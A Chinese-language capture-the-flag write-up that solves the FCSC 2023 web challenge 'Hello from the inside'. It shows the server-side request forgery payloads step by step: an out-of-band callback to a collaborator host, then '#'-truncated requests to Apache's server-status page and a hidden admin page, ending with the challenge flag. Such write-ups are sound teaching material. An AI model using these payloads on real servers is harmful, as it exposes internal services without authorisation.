## 描述

你的新实习生试图说服你：面向微服务的架构能显著提升系统的安全性。

为证明这一点，他决定创建一个“Hello world”概念验证，并匆忙部署到一台 Apache HTTP 服务器上。

实习结束时，你会录用这位实习生吗？

**注意：** 解决此挑战无需暴力破解。

```yaml
services:
  www:
    image: anssi/fcsc2023-web-hello-from-the-inside-www:latest
    ports:
      - "8000:8000"
    networks:
      - external
      - internal

  hello-microservice:
    image: anssi/fcsc2023-web-hello-from-the-inside-hello-microservice:latest
    networks:
      - internal

  bot:
    image: anssi/fcsc2023-web-hello-from-the-inside-bot:latest
    networks:
      - internal

networks:
  external:
  internal:
    internal: true

```

## 侦察

访问首页 `/`
- 响应
    ```http
    HTTP/1.1 200 OK
    Server: Apache/2.4.56 (Debian)
    X-Powered-By: PHP/8.0.30
    ```
    ```html
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/css/sticky-footer-navbar.css" rel="stylesheet">
    ```
    - 静态资源端点

    ```html
    uses a novel technic to greet users: microservices.

    <form class="d-flex" method="POST">
        <input class="me-2" type="name" placeholder="Your name" aria-label="Your name" name="name">
        <input type="hidden" name="service" value="hello-microservice">
        <button class="btn btn-outline-success" type="submit">
            Hello?
        </button>
    </form>
    ```
    - 本端点 POST，参数
        - `name`
        - `service=hello-microservice`
            - 参数值与挑战服务器同名

- 提交首页表单
    ```http
    POST / HTTP/1.1
    Host: 127.0.0.1:8000

    name=test&service=hello-microservice
    ```
    - 响应
        ```html
        <pre>
            <code class="small">
                Hello test
            </code>
        </pre>
        ```


## 功能探测

测试首页表单
- `name` 字段 XSS 请求
    ```http
    POST / HTTP/1.1

    name=<h3>test</h3>&service=hello-microservice
    ```
    - 响应
        ```html
        <code class="small">
            Hello &lt;h3&gt;test&lt;/h3&gt;
        </code>
        ```
    - `name` 字段的 HTML 标签被 HTML 编码

- `service` 字段服务器端请求伪造
    `name=fooo&service=localhost`
    - 响应中 `<code>` 标签内包含首页 HTML

    - 测试带外
        `name=fooo&service=id.oastify.com`
        - 协作服务器得到请求
            ```http
            GET /?name=fooo HTTP/1.1
            Host: id.oastify.com
            Accept: */*
            Connection: close
            Content-Length: 0
            ```
        - 分析
            - `service` 服务器 host
            - `name` GET 请求参数

- 似乎前端服务器 `localhost` 无内容，继续测试 `hello-microservice`，载荷
    `name=foo&service=hello-microservice/`
    - 响应
        ```html
        <code class="small">&lt;a href=&quot;/?name=foo&quot;&gt;Moved Permanently&lt;/a&gt;.

        </code>
        ```
        - 似乎揭示后端 XSS 注入点的上下文
            ```html
            <a href="§注入点§">
            ```
        - 然而测试带外，无

查看百科 [hacktricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/apache.html) apache 条目 
- 载荷 
    `name=&service=localhost/server-status?auto#`
    - 之前已探测 service 主机名后的路径分隔符拼接到 URI，使用注释 `#` 即随意设置请求参数
    - 响应
        ```log
        localhost
        ServerVersion: Apache/2.4.56 (Debian) PHP/8.0.30
        ServerMPM: prefork
        Server Built: 2023-04-02T03:06:01
        ...
        ```

- `name=&service=localhost/server-status#`，响应
    ```html
    <td nowrap>GET /fcsc-secret-admin-page-5d7f93d6/ HTTP/1.1</td>
    ```
    - 服务器状态面板中包含特异页面

- 访问特异页面
    `name=&service=127.0.0.1/fcsc-secret-admin-page-5d7f93d6/#`
    - 响应
        ```html
        <code class="small">
            FCSC{b7701b7c6a40ac1ec27ea7ade92fbe7b74c1444b13047a795435fb4d8c549828}
        </code>
        ```
    - 过程中尝试 `localhost` `127.1` 失败
